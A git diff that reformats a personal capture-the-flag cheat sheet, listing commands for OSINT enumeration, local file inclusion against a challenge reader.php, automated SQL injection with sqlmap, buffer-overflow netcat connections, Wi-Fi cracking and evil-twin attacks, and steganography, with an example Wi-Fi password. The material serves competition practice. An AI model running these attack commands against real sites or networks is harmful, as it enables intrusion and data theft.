@@ -1,33 +1,52 @@
-```
+# What To Do
+
+```bash
 source /home/milizes/pwntools-env/venv/bin/activate
 ```
 
-download every file of the boxes into a folder.
-set
+Download every file of the boxes into a folder.
+
+Set:
+
+```
 export TARGET=ip
-S=target sites SQLI, include the whole site, https://sit-sqli.chals.io
-T=target site LFI
+```
 
-OSINT challenges
+- S = target sites SQLI, include the whole site, https://sit-sqli.chals.io
+- T = target site LFI
+
+## OSINT challenges
+
+```bash
 ctf --enum $TARGET
+```
 
+## LFI
 
-**LFI**
-go to the page, and click on the url to see where ? starts
+Go to the page, and click on the url to see where `?` starts:
+
+```
 https://sit-lfi.chals.io/reader.php?page=welcome.php
+```
 
-if we are given the target file, like /secrets/notes.txt
+If we are given the target file, like `/secrets/notes.txt`, then we run:
 
-then we run
+```bash
 ctf --lfi "curl -s 'https://sit-lfi.chals.io/reader.php?page={P}'" --file secrets/notes.txt
+```
 
-if no file path given, reference ctfkit.md, maybe run ctf --web
+If no file path given, reference `ctfkit.md`, maybe run `ctf --web`.
 
-**SQLI, takes a long time**
-run immediately
+## SQLI, takes a long time
+
+Run immediately:
+
+```bash
 ctf --find-input "https://sit-sqli.chals.io"
+```
 
-example output
+Example output:
+
 ```
 == WHAT TO RUN NEXT ==
   1. address value 'id' is refused when changed (HTTP 403), and 'h' looks like a hash of it
@@ -46,33 +65,52 @@ example output
        ctf --find-input "https://sit-sqli.chals.io/account"
 ```
 
-run each ctf --sqlmap-auto command, follow it.
+Run each `ctf --sqlmap-auto` command, follow it.
 
-reference ctfkit.md if cant.
+Reference `ctfkit.md` if can't.
 
-**BOF**
+## BOF
+
+```bash
 cd pwntools-env/venv/bof-scripts-main/
-
-we will probably be given an ip, with a port for us to nc into
 ```
+
+We will probably be given an ip, with a port for us to nc into:
+
+```bash
 nc 3.144.177.121 5002
 ```
 
-reference bof.md
-if cannot, then reference schctf3.md for pwntools
+Reference `bof.md`. If cannot, then reference `schctf3.md` for pwntools.
 
-**Wireless**
+## Wireless
 
-given a .pcap file
-lowkey cooked but its 3 hardcoded 
+Given a `.pcap` file, lowkey cooked but its 3 hardcoded:
+
+```bash
 ctf --wifi-hidden
 ctf --wifi-crack
 ctf --evil-twin
-reference walkthrough.pdf
+```
 
+Reference `walkthrough.pdf`.
 
+If given a wordlist and an ssid, use:
 
-**Steg**
-given an image file
-ctf --stegchain <<image>>
+```bash
+ctf --wifi-crack file.pcap --ssid name --wordlist file.txt
+```
 
+Given a password: `FlatWhite2026CafeGuest`, ssid: `Cafe-Guest`, use:
+
+```bash
+ctf --evil-twin file.pcap --ssid name --psk password
+```
+
+## Steg
+
+Given an image file:
+
+```bash
+ctf --stegchain image.file
+```
